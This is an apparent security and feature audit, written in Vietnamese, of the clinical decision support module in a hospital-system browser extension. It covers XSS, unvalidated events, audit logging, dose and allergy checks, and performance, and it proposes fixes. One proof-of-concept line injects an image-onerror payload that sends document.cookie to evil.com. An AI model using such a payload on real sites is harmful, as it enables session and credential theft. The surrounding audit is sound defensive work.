# BÁO CÁO CẢI THIỆN MODULE CDS (Clinical Decision Support)

## Dự án: Aladinn — VNPT HIS Assistant

- **Ngày lập:** 10/04/2026
- **Phiên bản phân tích:** v1.0.0
- **Phạm vi:** Module CDS — 5 file: `index.js`, `db.js`, `engine.js`, `extractor.js`, `ui.js`
- **Phương pháp:** Static Code Analysis + Security Review + Performance Profiling + Clinical Accuracy Assessment

---

## MỤC LỤC

1. [Tổng quan Kiến trúc CDS](#1-tổng-quan-kiến-trúc-cds)
2. [Đánh giá Bảo mật](#2-đánh-giá-bảo-mật)
3. [Đánh giá Tính năng & Lâm sàng](#3-đánh-giá-tính-năng--lâm-sàng)
4. [Đánh giá Hiệu năng](#4-đánh-giá-hiệu-năng)
5. [Đánh giá UI/UX](#5-đánh-giá-uiux)
6. [Bảng Tổng hợp & Ưu tiên](#6-bảng-tổng-hợp--ưu-tiên)
7. [Lộ trình Triển khai](#7-lộ-trình-triển-khai)

---

## 1. Tổng quan Kiến trúc CDS

### Luồng Dữ liệu

```text
VNPT HIS DOM (iframe PhieuThuoc / Grid Thuốc)
        │
        ▼
┌─────────────────────┐
│   CDSExtractor      │ ← Scrape: Thuốc, ICD-10, Xét nghiệm, BN info
│   (extractor.js)    │
└────────┬────────────┘
         │  PatientContext
         ▼
┌─────────────────────┐     ┌──────────────────┐
│   Rule Engine       │◄────│   IndexedDB      │
│   (engine.js)       │     │   AladinnCDS     │
│   • DDI Rules       │     │   (db.js)        │
│   • Drug-Disease    │     │   • drug_generic  │
│   • Drug-Lab        │     │   • brand_map     │
│   • Dup Therapy     │     │   • ddi_rule      │
│   • Insurance       │     │   • insurance     │
└────────┬────────────┘     └──────────────────┘
         │  Alert[]
         ▼
┌─────────────────────┐
│   CDS UI Drawer     │ ← Shield icon + Panel 340px
│   (ui.js)           │
└─────────────────────┘
```

### Điểm Mạnh Hiện Tại

| # | Khả năng | Đánh giá |
|---|----------|----------|
| 1 | Phân tích 100% offline (IndexedDB) — không gửi PHI ra ngoài | ✅ Xuất sắc |
| 2 | Kiểm tra DDI (Drug-Drug Interaction) lookup O(n²) với HashMap | ✅ Tốt |
| 3 | Drug-Lab Interaction Rules dựa trên giá trị xét nghiệm thực | ✅ Mới, sáng tạo |
| 4 | Hash-cache tránh quét lại khi dữ liệu không đổi | ✅ Tiết kiệm CPU |
| 5 | Fuzzy matching (Levenshtein) cho tên thuốc viết sai | ✅ Nâng nhận diện |
| 6 | Alias Map VN → INN chuẩn quốc tế (51 alias) | ✅ Cần mở rộng |
| 7 | Import bookmarklet mở rộng Knowledge Base tại chỗ | ✅ Sáng tạo |
| 8 | Alert Fatigue filter (lọc mức low/info) | ✅ Tốt cho UX |

---

## 2. Đánh giá Bảo mật

---

### CDS-SEC-01: XSS qua `innerHTML` trong UI Drawer

#### Mức độ: HIGH

**File:** `ui.js` — dòng 382-388, 403-404, 413, 460, 482, 489

```javascript
// ui.js:383 — alert.title + alert.effect + alert.recommendation chèn thẳng HTML
card.innerHTML = `
    <div class="cds-alert-title">${this.getSeverityEmoji(alert.severity)} ${alert.title}</div>
    <div class="cds-alert-effect">${alert.effect}</div>
    <div class="cds-alert-rec">${alert.recommendation}</div>
    ${matchedHtml}
    ${linkHtml}
`;
```

**Vấn đề:** Dữ liệu từ `alert.effect` và `alert.recommendation` được nạp từ JSON rules (`ddi_rules.json`, `drug_disease_rules.json`), nhưng cũng có thể từ bookmarklet import (`importCrawledDrugs`). Nếu kẻ tấn công inject HTML/JS vào tên thuốc khi cào dữ liệu, XSS sẽ thực thi.

**PoC Attack Vector:**
```javascript
// Bookmarklet cào thuốc chứa payload
drugs = [{ ten: '<img src=x onerror="fetch(`https://evil.com?c=`+document.cookie)">', hc: 'paracetamol' }];
window.dispatchEvent(new CustomEvent('ALADINN_CRAWL_RESULT', { detail: { drugs } }));
```

Tên thuốc chứa payload sẽ được lưu vào IndexedDB → render qua `innerHTML` trong Coverage Pills.

**Đề xuất khắc phục:**
```javascript
// Hàm sanitize bắt buộc
function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// Áp dụng cho MỌI vị trí render dữ liệu
card.innerHTML = `
    <div class="cds-alert-title">${this.getSeverityEmoji(alert.severity)} ${escapeHtml(alert.title)}</div>
    <div class="cds-alert-effect">${escapeHtml(alert.effect)}</div>
    <div class="cds-alert-rec">${escapeHtml(alert.recommendation)}</div>
`;
```

---

### CDS-SEC-02: Thiếu Validation Input từ Bookmarklet (Event-Driven Import)

#### Mức độ: HIGH

**File:** `index.js` — dòng 211-242, `db.js` — dòng 256-337

```javascript
// index.js:211 — Nhận event từ BẤT KỲ script nào trên trang
window.addEventListener('ALADINN_CRAWL_RESULT', async (event) => {
    const drugs = event.detail?.drugs;
    // Không validate origin, không verify event source
    // Không sanitize drug names trước khi lưu DB
    const result = await importCrawledDrugs(drugs);
});
```

**Vấn đề:**
1. **Không verify event origin** — Bất kỳ script nào trên vncare.vn (bao gồm 3rd-party ads, tracking scripts) đều có thể dispatch `ALADINN_CRAWL_RESULT`
2. **Không sanitize** `drug.ten` và `drug.hc` trước khi lưu vào IndexedDB
3. **Không giới hạn kích thước** — Có thể gửi hàng triệu entries gây DoS IndexedDB

**Đề xuất khắc phục:**
```javascript
// 1. Validate event source
window.addEventListener('ALADINN_CRAWL_RESULT', async (event) => {
    // Chỉ chấp nhận từ trusted bookmarklet có mã xác thực
    if (!event.detail?.authToken || event.detail.authToken !== expectedToken) return;

    const drugs = event.detail?.drugs;
    if (!Array.isArray(drugs) || drugs.length > 5000) return; // Giới hạn

    // 2. Sanitize mỗi entry
    const sanitized = drugs.map(d => ({
        ten: String(d.ten || '').slice(0, 200).replace(/[<>"']/g, ''),
        hc: String(d.hc || '').slice(0, 200).replace(/[<>"']/g, '')
    }));

    const result = await importCrawledDrugs(sanitized);
});
```

---

### CDS-SEC-03: Audit Trail Thiếu cho Quyết định Lâm sàng

#### Mức độ: MEDIUM

**File:** `db.js` — dòng 19, 31 (AUDIT_LOG_STORE đã khai báo nhưng CHƯA DÙNG)

```javascript
// db.js:19 — Store đã tạo
const AUDIT_LOG_STORE = 'audit_log';

// db.js:198 — Function đã viết
export async function logAuditEvent(record) { ... }

// engine.js:15 — ĐÃ COMMENT OUT, KHÔNG GỌI
// import { logAuditEvent } from './db.js'; // ← COMMENTED
```

**Vấn đề:** CDS phát hiện tương tác thuốc nguy hiểm nhưng KHÔNG ghi lại:
- Bác sĩ có nhìn thấy cảnh báo không?
- Bác sĩ có bỏ qua cảnh báo CRITICAL không?
- Thời điểm nào, bệnh nhân nào, thuốc nào?

Trong y tế, thiếu audit trail = trách nhiệm pháp lý khi xảy ra sự cố thuốc.

**Đề xuất khắc phục:**
```javascript
// Ghi log khi: (1) Alert critical được phát, (2) User đóng panel bỏ qua
await logAuditEvent({
    timestamp: new Date().toISOString(),
    patientId: context.patient.id,          // Đã hash/anonymize
    action: 'CDS_ALERT_DISPLAYED',
    alertCodes: alerts.map(a => a.rule_code),
    severityMax: alerts[0]?.severity || 'none',
    drugCount: context.medications.length,
    acknowledged: false                      // true khi user click "Đã xem"
});
```

---

### CDS-SEC-04: IndexedDB Không Mã Hóa

#### Mức độ: MEDIUM

**File:** `db.js`

IndexedDB `AladinnCDS` lưu toàn bộ Knowledge Base (tên thuốc, quy tắc lâm sàng, danh mục BHYT) dưới dạng **plaintext**. Trên macOS:

```
~/Library/Application Support/Google/Chrome/Default/IndexedDB/
    chrome-extension_<id>_0.indexeddb.leveldb/
```

**Rủi ro:** Bất kỳ process nào trên macOS đều đọc được file này. Tuy nhiên, dữ liệu KB không chứa PHI trực tiếp — chỉ chứa drug rules. Rủi ro thấp hơn so với dữ liệu bệnh nhân.

**Đề xuất:** Mức ưu tiên thấp. Nếu cần, mã hóa tên bệnh nhân trong audit_log trước khi lưu.

---

### CDS-SEC-05: `FORCE_CDS_SYNC` Event Không Xác Thực

#### Mức độ: MEDIUM

**File:** `index.js` — dòng 191-199

```javascript
window.addEventListener('message', async (event) => {
    if (event.data && event.data.type === 'FORCE_CDS_SYNC') {
        await initializeKnowledgeBase(true); // forceSync = true → XÓA + SEED LẠI DB
    }
});
```

**Vấn đề:** Bất kỳ `postMessage` nào có `type: 'FORCE_CDS_SYNC'` đều trigger xóa và tải lại toàn bộ Knowledge Base từ JSON bundled. Đây là vector DoS — liên tục gửi message sẽ lock browser.

**Đề xuất:**
```javascript
// Rate limit + origin check
let lastSyncTime = 0;
window.addEventListener('message', async (event) => {
    if (event.data?.type === 'FORCE_CDS_SYNC') {
        if (event.origin !== window.location.origin) return;
        if (Date.now() - lastSyncTime < 60000) return; // Max 1 lần/phút
        lastSyncTime = Date.now();
        await initializeKnowledgeBase(true);
    }
});
```

---

## 3. Đánh giá Tính năng & Lâm sàng

---

### CDS-FEAT-01: Drug-Lab Rules Hardcoded — Không Mở Rộng Được

#### Mức độ: HIGH (Impact)

**File:** `engine.js` — dòng 318-442

Hiện tại có **15 Drug-Lab rules** được hardcode trực tiếp trong code:
- Warfarin + INR
- Metformin + eGFR
- Digoxin + Creatinine
- Statin + ALT
- Insulin/SU + Glucose
- ...

**Vấn đề:**
1. Thêm rule mới = sửa source code + rebuild
2. Bệnh viện không thể tùy chỉnh ngưỡng (VD: ALT > 120 vs > 100)
3. Không export/import được

**Đề xuất:** Chuyển Drug-Lab Rules vào IndexedDB:

```javascript
// Thêm store mới: drug_lab_rule
const DRUG_LAB_RULE_STORE = 'drug_lab_rule';

// Mỗi rule = 1 JSON record
{
    rule_code: 'DL-WARFARIN-INR-HIGH',
    drugs: ['warfarin'],
    lab_code: 'INR',
    operator: '>',
    threshold: 3.0,
    severity: 'high',
    effect_vi: 'INR > 3.0 — Nguy cơ xuất huyết rất cao!',
    recommendation_vi: 'Xem xét giảm liều Warfarin.',
    is_active: true,
    source: 'UpToDate 2025'
}
```

---

### CDS-FEAT-02: Thiếu Kiểm Tra Liều Lượng (Dose Check)

#### Mức độ: HIGH (Clinical Gap)

**Hiện trạng:** CDS chỉ check:
- Tương tác thuốc-thuốc (DDI)
- Chống chỉ định bệnh lý (Drug-Disease)
- Tương tác thuốc-xét nghiệm (Drug-Lab)
- Trùng nhóm trị liệu (Duplicate Therapy)
- BHYT (Insurance)

**Thiếu:** Kiểm tra liều lượng — 1 trong 5 trụ cột CDS tiêu chuẩn.

**Ví dụ lâm sàng:**
- Paracetamol > 4g/ngày (người lớn) hoặc > 75mg/kg/ngày (trẻ em) → Ngộ độc gan
- Metformin > 2550mg/ngày → Quá liều
- Vancomycin ở bệnh nhân suy thận cần hiệu chỉnh liều

**Đề xuất:** Thêm Dose Check Engine:

```javascript
// Extractor: trích xuất liều + tần suất từ grid
getMedicationsWithDose() {
    // Cột "Liều dùng", "Số lần/ngày", "Số ngày" trên HIS
    return {
        display_name: 'Paracetamol 500mg',
        generic_candidate: 'paracetamol',
        dose_per_unit: 500,       // mg
        frequency: 3,             // lần/ngày
        duration: 5,              // ngày
        daily_dose: 1500          // mg/ngày (tính toán)
    };
}

// Engine: so sánh với max_daily_dose trong drug_generic
{
    generic_name: 'paracetamol',
    max_daily_dose_mg: 4000,
    max_dose_per_kg: 75,          // mg/kg (pediatric)
    renal_adjust: false
}
```

---

### CDS-FEAT-03: Thiếu Allergy Check

#### Mức độ: HIGH (Clinical Gap)

**File:** `engine.js` — dòng 12, `db.js` — dòng 16, 28

```javascript
// engine.js:12 — ĐÃ IMPORT NHƯNG COMMENT OUT
// getDrugAllergyRules,

// db.js:16 — Store đã khai báo
const DRUG_ALLERGY_RULE_STORE = 'drug_allergy_rule';
```

**Vấn đề:** Hạ tầng Allergy Check đã xây dựng (DB store, data file) nhưng chưa kích hoạt:
1. Không trích xuất tiền sử dị ứng từ HIS DOM
2. Không chạy allergy rules trong engine
3. Cross-allergy (VD: dị ứng Penicillin → cảnh báo Cephalosporin) chưa implement

**Đề xuất:**

```javascript
// Extractor: thêm method getAllergies()
getAllergies() {
    const els = this.getElementsAcrossIframes('#txtDiUng, [id*="DiUng"], [name*="allergy"]');
    const allergies = [];
    els.forEach(el => {
        const text = (el.value || el.innerText || '').toLowerCase();
        // Parse: "dị ứng penicillin, sulfa"
        text.split(/[,;]/).forEach(a => {
            const trimmed = a.replace(/dị ứng|allergy/gi, '').trim();
            if (trimmed) allergies.push(trimmed);
        });
    });
    return allergies;
}

// Engine: runAllergyRules()
function runAllergyRules(allergyRules, normalized, allergies) {
    // Cross-reactivity: penicillin → amoxicillin, ampicillin, ...
    // Sulfa → sulfamethoxazole, ...
}
```

---

### CDS-FEAT-04: Alias Map Cần Mở Rộng Đáng Kể

#### Mức độ: MEDIUM

**File:** `engine.js` — dòng 18-52 (51 alias), `db.js` — dòng 208-236 (35 alias — TRÙNG LẶP)

**Vấn đề:**
1. **Trùng lặp:** 2 bản sao ALIAS_MAP riêng biệt trong `engine.js` và `db.js` → dễ lệch
2. **Thiếu nhiều alias phổ biến tại Việt Nam:**

| Tên VN | Tên INN đúng | Có trong Map? |
|--------|-------------|---------------|
| Augmentin | amoxicillin-clavulanate | ✅ |
| Efferalgan | paracetamol | ❌ |
| Doliprane | paracetamol | ❌ |
| Nexium | esomeprazole | ❌ |
| Lipitor | atorvastatin | ❌ |
| Plavix | clopidogrel | ❌ |
| Coversyl | perindopril | ❌ |
| Concor | bisoprolol | ❌ |
| Xarelto | rivaroxaban | ❌ |
| Eliquis | apixaban | ❌ |
| Lantus | insulin glargine | ❌ |
| Novorapid | insulin aspart | ❌ |
| Crestor | rosuvastatin | ❌ |
| Tavanic | levofloxacin | ❌ |

3. **Suffix normalization thiếu:** `engine.js:57-60` — Rule "on→one" quá mạnh, bắt nhầm (VD: "interferon" → "interferone")

**Đề xuất:**
- Gộp ALIAS_MAP vào 1 file duy nhất (`cds-data/alias_map.json`)
- Bổ sung ~100 biệt dược phổ biến tại VN
- Thêm bảo vệ suffix: chỉ apply cho từ > 6 ký tự, exclude list (`interferon`, `tamoxifen`, ...)

---

### CDS-FEAT-05: Extractor Thiếu Robust — Phụ Thuộc DOM Layout

#### Mức độ: MEDIUM

**File:** `extractor.js`

**Vấn đề:**
1. **`getMedications()`** (dòng 126-241): Duyệt TOÀN BỘ `<tr>` trên trang → bắt nhầm row không phải thuốc
2. **`getDiagnoses()`** (dòng 72-123): Regex quét text rộng → có thể bắt số phòng (VD: "A301" → ICD A30.1)
3. **`getLabs()`** (dòng 243-280): Phụ thuộc `window._aladinn_cds_labs` (cached) — nếu Scanner chưa chạy hoặc data cũ → CDS không có xét nghiệm
4. Không trích xuất **tuổi, giới tính** → không thể check liều nhi khoa, chống chỉ định thai kỳ

**Đề xuất:**
```javascript
// 1. Thêm extractAge() và extractGender()
getAge() {
    const els = this.getElementsAcrossIframes('#txtTuoi, [id*="Tuoi"], [id*="TUOI"]');
    for (const el of els) {
        const val = parseInt(el.value || el.innerText);
        if (!isNaN(val) && val > 0 && val < 150) return val;
    }
    return undefined;
},

getGender() {
    const els = this.getElementsAcrossIframes('#txtGioiTinh, [id*="GioiTinh"]');
    for (const el of els) {
        const text = (el.value || el.innerText || '').toLowerCase();
        if (text.includes('nam') || text === 'male') return 'M';
        if (text.includes('nữ') || text === 'female') return 'F';
    }
    return undefined;
}

// 2. Filter ICD codes chặt hơn — loại trừ pattern phòng/tầng
getDiagnoses() {
    // Thêm exclude: A3xx không phải ICD nếu đi kèm "tầng", "phòng", "lầu"
    const EXCLUDE_CONTEXT = /tầng|lầu|phòng|tòa|khu|block/i;
}
```

---

### CDS-FEAT-06: Insurance Rules Chưa Đủ Sâu

#### Mức độ: MEDIUM

**File:** `engine.js` — dòng 498-537

Hiện tại chỉ check 2 loại:
1. Thuốc ngoài danh mục BHYT (`is_covered: false`)
2. Thiếu ICD prefix phù hợp (`icd_prefix_required`)

**Thiếu:**
- Giới hạn số ngày dùng BHYT (VD: kháng sinh tối đa 7 ngày ngoại trú)
- Giới hạn số lượng thuốc/lần kê (VD: max 5 loại ngoại trú)
- Trùng hoạt chất cùng ngày (xuất toán BHYT)
- Quy tắc kê đơn ngoại trú vs nội trú khác nhau

**Đề xuất:** Thêm các rule type:
```json
[
    { "rule_code": "INS-MAX-DAYS-AB-001", "condition_type": "max_duration_days", "condition_value": "7", "generic_name": "amoxicillin", "care_setting": "opd" },
    { "rule_code": "INS-DUP-ACTIVE-001", "condition_type": "no_duplicate_generic", "message": "Trùng hoạt chất trong cùng đơn — BHYT có thể từ chối" }
]
```

---

## 4. Đánh giá Hiệu năng

---

### CDS-PERF-01: Full-Table Scan Mỗi 3 Giây

#### Mức độ: MEDIUM

**File:** `index.js` — dòng 89

```javascript
scanTimer = setInterval(runScan, 3000);
```

Mỗi lần `runScan()`:
1. `extractContext()` → duyệt **TOÀN BỘ** `<tr>`, `<iframe>`, input fields
2. `normalizeContext()` → mở IndexedDB, load 3 stores, chạy Levenshtein
3. `analyzeLocally()` → mở IndexedDB lần 2, load 5 stores, chạy 5 rule engines

**Ước tính:** ~50-150ms mỗi scan trên đơn 10 thuốc. Với interval 3s, CPU bận ~5% liên tục.

**Đề xuất:**
```javascript
// 1. Cache DB data trong memory (load 1 lần, dùng nhiều lần)
let cachedGenericMap = null;
let cachedBrandMap = null;

async function ensureCache() {
    if (!cachedGenericMap) {
        const db = await openDatabase();
        cachedGenericMap = await getDrugGenericMap(db);
        cachedBrandMap = await getBrandMap(db);
        // ... cache tất cả stores
    }
}

// 2. Debounce thay interval — chỉ quét khi user ngưng gõ
let scanDebounce = null;
const debouncedScan = () => {
    clearTimeout(scanDebounce);
    scanDebounce = setTimeout(runScan, 1000);
};

// 3. MutationObserver trên grid thay vì polling
const gridObserver = new MutationObserver(debouncedScan);
gridObserver.observe(prescriptionGrid, { childList: true, subtree: true });
```

---

### CDS-PERF-02: Levenshtein Distance O(n×m) Chạy Trên TOÀN BỘ Generic Map

#### Mức độ: LOW

**File:** `engine.js` — dòng 84-99

```javascript
function findClosestGeneric(token, genericMap) {
    for (const generic of genericMap.keys()) {     // ~500+ entries
        const dist = levenshteinDistance(token, generic); // O(n×m)
    }
}
```

400 thuốc × 30 ký tự trung bình = ~360,000 operations mỗi unmapped drug.

**Đề xuất:** Thêm BK-Tree hoặc prefix filtering:
```javascript
// Pre-filter: chỉ so sánh thuốc có cùng ký tự đầu ± 1
function findClosestGeneric(token, genericMap) {
    const firstChar = token[0];
    const candidates = [...genericMap.keys()].filter(g =>
        Math.abs(g.charCodeAt(0) - firstChar.charCodeAt(0)) <= 1
    );
    // Chỉ chạy Levenshtein trên candidates (~30-50 thay vì 500+)
}
```

---

## 5. Đánh giá UI/UX

---

### CDS-UX-01: Shield Icon Không Đủ Nổi Bật Khi CRITICAL

**File:** `ui.js` — dòng 343-353

Shield icon hiện tại chỉ đổi viền + animation pulse. Với cảnh báo CRITICAL (nguy cơ tử vong — VD: Warfarin + INR > 3.0), icon cần nổi bật hơn.

**Đề xuất:**
- Critical: Icon đỏ nhấp nháy + badge số lượng alert + sound notification (optional)
- Tự động bung panel khi phát hiện ≥1 CRITICAL alert (override hasUserDismissed 1 lần)

---

### CDS-UX-02: Không Có "Acknowledge" Button

Khi bác sĩ nhìn thấy cảnh báo, không có cách ghi nhận "Tôi đã đọc và quyết định tiếp tục". Điều này:
1. Không tạo audit trail
2. Không phân biệt "chưa thấy" vs "thấy rồi, bỏ qua"

**Đề xuất:** Thêm nút "Đã xem" hoặc "Bỏ qua — Có lý do lâm sàng":
```html
<button class="cds-ack-btn" onclick="acknowledgeAlert('DDI-WARFARIN-ASP-001')">
    ✓ Đã xem, tiếp tục kê đơn
</button>
```

---

### CDS-UX-03: Không Hiển Thị Nguồn Tham Khảo

Alert cards thiếu trích nguồn (reference). Bác sĩ cần biết khuyến cáo đến từ đâu (UpToDate, BNF, MIMS, Dược thư Việt Nam).

**Đề xuất:** Thêm field `source` trong mỗi rule:
```javascript
{ source: 'Dược thư Quốc gia Việt Nam 2024, tr.215' }

// Render
<div class="cds-alert-source">📖 Dược thư QG VN 2024</div>
```

---

## 6. Bảng Tổng hợp & Ưu tiên

| ID | Loại | Vấn đề | Severity | Ưu tiên |
|----|------|--------|----------|---------|
| CDS-SEC-01 | Bảo mật | XSS qua innerHTML trong UI | High | **P0** |
| CDS-SEC-02 | Bảo mật | Import Event không validate | High | **P0** |
| CDS-SEC-03 | Bảo mật | Thiếu Audit Trail lâm sàng | Medium | **P1** |
| CDS-SEC-05 | Bảo mật | FORCE_CDS_SYNC DoS | Medium | **P1** |
| CDS-SEC-04 | Bảo mật | IndexedDB plaintext | Medium | P3 |
| CDS-FEAT-01 | Tính năng | Drug-Lab Rules hardcoded | High | **P1** |
| CDS-FEAT-02 | Tính năng | Thiếu Dose Check | High | **P1** |
| CDS-FEAT-03 | Tính năng | Thiếu Allergy Check | High | **P1** |
| CDS-FEAT-04 | Tính năng | Alias Map thiếu | Medium | **P2** |
| CDS-FEAT-05 | Tính năng | Extractor thiếu robust | Medium | **P2** |
| CDS-FEAT-06 | Tính năng | Insurance rules nông | Medium | **P2** |
| CDS-PERF-01 | Hiệu năng | Polling 3s + double DB open | Medium | **P2** |
| CDS-PERF-02 | Hiệu năng | Levenshtein brute force | Low | P3 |
| CDS-UX-01 | UI/UX | Shield chưa đủ nổi bật | Medium | **P2** |
| CDS-UX-02 | UI/UX | Thiếu Acknowledge button | Medium | **P2** |
| CDS-UX-03 | UI/UX | Thiếu nguồn tham khảo | Low | P3 |

---

## 7. Lộ trình Triển khai

### Sprint 1 — Bảo mật Cấp bách (1-2 ngày)

| Task | File | Thay đổi |
|------|------|----------|
| Sanitize HTML output | `ui.js` | Thêm `escapeHtml()`, apply toàn bộ `innerHTML` |
| Validate import event | `index.js` | Rate limit + size limit + sanitize input |
| Rate limit FORCE_CDS_SYNC | `index.js` | Origin check + throttle 60s |

### Sprint 2 — Tính năng Lâm sàng (1-2 tuần)

| Task | File | Thay đổi |
|------|------|----------|
| Kích hoạt Allergy Check | `engine.js`, `extractor.js` | Uncomment + implement `getAllergies()` |
| Drug-Lab Rules → IndexedDB | `db.js`, `engine.js` | Chuyển hardcoded → JSON data file |
| Dose Check cơ bản | `engine.js`, `extractor.js` | Trích xuất liều, so sánh max_daily_dose |
| Audit Log | `engine.js`, `db.js` | Enable `logAuditEvent()` + UI Acknowledge |
| Gộp Alias Map | `engine.js`, `db.js` | 1 file `alias_map.json`, bổ sung ~100 biệt dược |

### Sprint 3 — Trải nghiệm & Tối ưu (1 tuần)

| Task | File | Thay đổi |
|------|------|----------|
| Cache DB in memory | `engine.js` | Load 1 lần, invalidate khi import |
| Debounce thay polling | `index.js` | MutationObserver + debounce 1s |
| Shield auto-open khi CRITICAL | `ui.js` | Override dismiss 1 lần cho P0 alerts |
| Thêm "Đã xem" button | `ui.js` | Button + logAuditEvent |
| Extractor robustness | `extractor.js` | Thêm tuổi/giới tính, filter ICD chặt hơn |

---

## Phụ lục: So sánh với Tiêu chuẩn CDS Quốc tế

| Trụ cột CDS (AHRQ/ONC) | Aladinn v1.0 | Mục tiêu v2.0 |
|--------------------------|-------------|----------------|
| Drug-Drug Interaction | ✅ Có | ✅ Mở rộng |
| Drug-Allergy | ⚠️ Có hạ tầng, chưa bật | ✅ Kích hoạt |
| Drug-Disease Contraindication | ✅ Có | ✅ Mở rộng |
| Dose Range Check | ❌ Chưa có | ✅ Cơ bản |
| Duplicate Therapy | ✅ Có | ✅ Cải thiện |
| Drug-Lab Interaction | ✅ Có (hardcoded) | ✅ Dynamic rules |
| Insurance Formulary | ✅ Có | ✅ Mở rộng |
| Audit Trail | ❌ Khai báo, chưa dùng | ✅ Kích hoạt |
| Clinical References | ❌ Chưa có | ✅ Thêm source |
| Pediatric/Geriatric Dosing | ❌ Chưa có | ⚠️ Phase 2 |

---

**Kết luận:** Module CDS của Aladinn có kiến trúc solid (offline-first, IndexedDB, fuzzy matching), nhưng cần 3 cải thiện khẩn cấp: (1) Sanitize HTML output tránh XSS, (2) Validate input từ bookmarklet, (3) Kích hoạt Allergy Check + Audit Trail đã có hạ tầng sẵn. Lộ trình 3 sprint (~1 tháng) sẽ đưa CDS từ MVP lên tiêu chuẩn AHRQ/ONC cấp cơ bản.

---

Báo cáo v1.0 — 10/04/2026
